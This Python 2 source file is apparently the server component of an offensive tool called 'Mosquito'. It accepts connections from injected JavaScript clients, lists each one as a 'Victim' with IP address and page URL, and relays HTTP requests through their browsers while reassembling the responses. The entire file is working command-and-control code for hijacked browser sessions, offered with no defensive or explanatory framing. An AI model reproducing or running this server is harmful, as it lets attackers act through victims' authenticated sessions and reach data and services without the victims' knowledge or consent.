#!/usr/bin/env python
import socket
import threading
import SocketServer
from defer import *
import json
import re
import base64
import logging
import time

class MosquitoRequest:
    """
        Class used to represent URL request being sent over the wire to Mosquito JS client
    """
    counter = 0

    def __init__(self, typ, data):
        MosquitoRequest.counter += 1
        self.id = MosquitoRequest.counter
        self.type = typ
        self.data = data

    def __str__(self):
        return json.dumps([self.id, self.type, self.data])

class MosquitoRequestHandler(SocketServer.BaseRequestHandler):

    """
    Class handling incoming TCP connections from Mosquito JS clients
    Uses Custom protocol - JSON objects separated with separator
    """
    End="\n:WSEP:\n"
    last_data = ''
    hello_msg = {}
    last_response = time.localtime()
    sent = 0
    received = 0

    def handle(self):
        logging.debug("MosquitoRequestHandler.handle")
        self.server.register_client(self)

        while True:
            data = self.recv_end(self.request)
            try:
                msg = json.loads(data)
            except ValueError:
                logging.error("Error reading from Mosquito Client")
                f = open('error.log', 'w')
                f.write(data)
                f.close()
                continue

            if 'hello' in msg:
                self.handle_hello(msg)

            elif 'id' in msg:
                self.handle_incoming_response(msg)

    def recv_end(self,the_socket):
        total_data=[];data=''
        while True:
                data=self.last_data+the_socket.recv(8192)
                self.last_data = ""
                if self.End in data:
                    total_data.append(data[:data.find(self.End)])
                    self.last_data = data[data.find(self.End)+len(self.End):]
                    break
                total_data.append(data)
                if len(total_data)>1:
                    #check if end_of_data was split
                    last_pair=total_data[-2]+total_data[-1]
                    if self.End in last_pair:
                        total_data[-2]=last_pair[:last_pair.find(self.End)]
                        self.last_data = last_pair[last_pair.find(self.End)+len(self.End):]
                        total_data.pop()
                        break
        return ''.join(total_data)

    def handle_hello(self, d):
        logging.info("Mosquito client connected: %s", d)
        self.hello_msg = d

    def handle_incoming_response(self, msg):
        logging.debug('Response to req #%d', msg['id'])
        self.server.call_defer(msg['id'], msg)

    def process_response(self, resp):
        self.received += 1
        self.last_response = time.localtime()
        h = []
        if 'headers' in resp['data']:
            h = re.findall(r"(?P<name>.*?): (?P<value>.*?)\r\n", resp['data']['headers'])

        def remove_header(h, name):
            lcase = [x[0].lower() for x in h]
            try:
                i = lcase.index(name.lower())
                del(h[i])
            except ValueError:
                pass
            return h

        # remove original length/encoding (might be gzipped)
        h = remove_header(h, 'content-length')
        h = remove_header(h, 'content-encoding')
        h = remove_header(h, 'connection')

        body = ""
        if 'body' in resp['data']:
            body = base64.b64decode(resp['data']['body'])

        t = ('Content-Length', str(len(body)))
        h.append(t)

        return ( resp['data']['status'], resp['data']['statusText'],
                 h , body)

    def _wait_for_response(self, id):
        d = Deferred()
        d.add_callback(self.process_response)
        d.client_id = self.server.clients.index(self)
        self.server.add_defer(id, d)
        return d

    @inline_callbacks
    def _send_request_deferred(self, request):
        id = request.id
        self.sent += 1
        self.request.sendall(str(request))

        #defer madness here
        retval = yield self._wait_for_response(id)
        return_value(retval)

    def send_request_and_wait(self, request):
        logging.debug('sending req #%d', request.id)
        defer = self._send_request_deferred(request)
        while not defer.called:
            pass
        return defer.result

    def id(self):
        id_ = "?"
        try:
            id_ = str(self.server.clients.index(self))
        except:
            pass
        return id_

    def url(self):
        url_ = "?"
        try:
            url_ = self.hello_msg['url']
        except:
            pass
        return url_

    def __str__(self):
        return 'Victim #%s: %s:%d %s (%d/%d %s)' % (
            self.id(),
            self.client_address[0],
            self.client_address[1],
            self.url(),
            self.sent,
            self.received,
            time.strftime('%Y-%m-%d %H:%M:%S', self.last_response),
            )


class MosquitoTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    """
        Mosquito TCP server, handling incoming connections in separate threads
    """

    allow_reuse_address = True
    daemon_threads = True
    default_client = -1
    clients = []

    def __init__(self, server_address, RequestHandlerClass):
        SocketServer.TCPServer.__init__(self, server_address, RequestHandlerClass)
        self.defers = {}

    def add_defer(self, id, defer):
        self.defers[id] = defer
        logging.debug("Queue len: %d", len(self.defers))

    def get_client(self):
        try:
            return self.clients[self.default_client]
        except KeyError:
            return None

    def is_default_client(self, id):
        try:        
            if self.clients[self.default_client] == self.clients[id]:
                return True
        except KeyError:
            return False

        return False

    def register_client(self, client):
        self.clients.append(client)
        logging.info("Registered Mosquito client #%d", len(self.clients) - 1)

    def kick_client_by_addr(self, addr):
        to_remove = [k for k,v in enumerate(self.clients) if v.client_address == addr]
        for key in to_remove:
            
            # send failing response for pending requests
            to_remove2 = [k for k in self.defers if self.defers[k].client_id == key]
            for key2 in to_remove2:
                logging.info("Removing stale request #%d", key2)
                self.call_defer(key2, self.build_error_response(501, 'Mosquito client died, consider switching to other client.'))
            
            logging.info("Removing Mosquito client #%d", key) 

            self.clients[key] = None

    def call_defer(self, id, callback_params):
        if not id in self.defers:
            logging.error("id not found in deferred requests: %d", id)
            return
        d = self.defers[id]
        d.callback(callback_params)
        del(self.defers[id])

    def handle_error(self, request, client_address):
        # kill client on error, no mercy
        logging.info("Socket error, killing request from %s:%d", client_address[0], client_address[1])
        self.kick_client_by_addr(client_address)

    def close_request(self, request):
        """Called to clean up an individual request."""
        request.close()
    
    def build_error_response(self, code, msg):
        return {
            'data': {
                'body': base64.b64encode('<h2>' + msg + '</h2>'),
                'status': code,
                'headers': 'Content-Type: text/html',
                'statusText': msg
            }
        }        


